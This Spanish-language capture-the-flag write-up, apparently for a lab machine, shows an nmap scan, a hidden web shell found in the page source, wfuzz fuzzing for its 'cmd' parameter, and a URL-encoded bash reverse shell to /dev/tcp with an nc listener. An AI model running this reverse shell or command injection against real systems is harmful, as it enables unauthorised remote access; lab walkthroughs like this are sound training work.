# Walking Dead - Writeup

## Resumen
Lorem Ipsum

## Paso N1: Reconocimiento
Empezamos escaneando los puertos TCP con sus respectivos servicios y versiones.
```
nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000 -oG open_ports
```
<img width="670" height="418" alt="image" src="https://github.com/user-attachments/assets/9e26a269-823d-4f51-b28e-ff5e3e0891f8" />

Veremos que están abiertos los puertos 22 y 80 correspondientes a ssh y http respectivamente.

## Paso N2: Visualización web
Una vez dentro de la página, si la inspeccionamos (o vemos su código fuente) encontraremos la siguiente línea 
```
<a href="hidden/.shell.php">Access Panel</a>
```
<img width="435" height="144" alt="image" src="https://github.com/user-attachments/assets/c48d4509-768e-4a8a-bdda-e463b5840977" />

Dejándonos el subdirectorio oculto `/hidden/.shell.php`, y una vez dentro, veremos que no hay contenido alguno.

## Paso N3: Parámetro vulnerable
Una vez dentro de la página, no veremos mucha cosa más, por lo que empezaremos a fuzzear parámetros vulnerables con wfuzz
```
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --hw 0 -u 'http://172.17.0.2/hidden/.shell.php?FUZZ=id'
```
<img width="671" height="393" alt="image" src="https://github.com/user-attachments/assets/6b4fd71c-e666-4593-a2ee-6d4f64cd556c" />

Encontramos el parámetro vulnerable `cmd`, por lo que si encodeamos a url `bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'`, escuchamos en una terminal en el puerto 443 con `nc -lvnp 443` y ponemos de comando la reverse shell encodeada a url habremos obtenido acceso al sistema 
```
http://172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F443%200%3E%261%27%0A
```
<img width="670" height="196" alt="image" src="https://github.com/user-attachments/assets/5d79d850-f7e8-40c5-bdcc-92e8af6f0326" />

